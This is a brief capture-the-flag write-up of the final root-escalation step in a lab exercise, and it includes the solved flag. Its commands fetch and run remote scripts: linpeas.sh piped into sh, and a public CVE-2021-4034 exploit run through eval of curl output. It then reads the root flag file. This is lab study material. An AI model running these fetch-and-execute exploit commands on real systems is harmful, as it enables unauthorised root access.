## 7. Final step of CTF : get access to root

### Exercises

1. Get the root access and find the flag.

> Flag : BC{y0ur_f1r57_r007_fl46#_w3ll_d0n3}

Linpeas : 

    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

After reading multiple vulnerability, i found one that led me to a github script :

    eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"

You're now in the shell as root :

    cd /root/
    cat flag.txt
